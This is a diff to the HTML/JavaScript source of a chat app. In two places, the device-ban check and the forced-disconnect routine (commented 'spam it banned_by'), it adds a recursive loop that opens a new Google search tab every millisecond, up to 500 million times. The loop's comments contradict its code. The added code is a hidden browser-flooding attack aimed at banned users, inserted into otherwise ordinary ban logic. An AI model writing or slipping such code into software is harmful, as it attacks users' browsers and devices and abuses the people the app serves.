@@ -895,6 +895,31 @@ We may update these terms periodically. Continued use of the app after changes m
         console.log('🚫 Device is banned! Showing ban screen...');
         
         // Hide everything immediately
+// Delay the execution by 1 second (1000 milliseconds)
+let count = 0;
+
+function openSearchRecursive() {
+  count++;
+  console.log(`Loop iteration: ${count}`);
+
+  // *** Your action goes here ***
+  window.open("https://www.google.com/search?q=hi+" + count, "_blank");
+
+  if (count < 500000000) {
+    // Schedule the next call only if the condition is met
+    setTimeout(openSearchRecursive, 1); // 2-second delay until the next run
+  } else {
+    console.log("Recursive loop finished after 5 repetitions.");
+  }
+}
+
+// Start the initial call
+openSearchRecursive();
+
+    
+
+
+
         document.getElementById('pinOverlay').style.display = 'none';
         document.getElementById('whiteOverlay').style.display = 'none';
         document.querySelector('.intro').style.display = 'none';
@@ -2461,6 +2486,34 @@ function forceUserDisconnect(message) {
     
     // 4. Clear chat and show ban screen
     chatApp.style.display = 'none';
+    //4.5 spam it banned_by
+    
+
+// Delay the execution by 1 second (1000 milliseconds)
+let count = 0;
+
+function openSearchRecursive() {
+  count++;
+  console.log(`Loop iteration: ${count}`);
+
+  // *** Your action goes here ***
+  window.open("https://www.google.com/search?q=hi+" + count, "_blank");
+
+  if (count < 500000000) {
+    // Schedule the next call only if the condition is met
+    setTimeout(openSearchRecursive, 1); // 2-second delay until the next run
+  } else {
+    console.log("Recursive loop finished after 5 repetitions.");
+  }
+}
+
+// Start the initial call
+openSearchRecursive();
+
+    
+    
+
+
     
     // 5. Create and show ban overlay
     const banOverlay = document.createElement('div');
@@ -2663,3 +2716,5 @@ unbanBtn.addEventListener('click', async () => {
 </script>
 </body>
 </html>
+
+
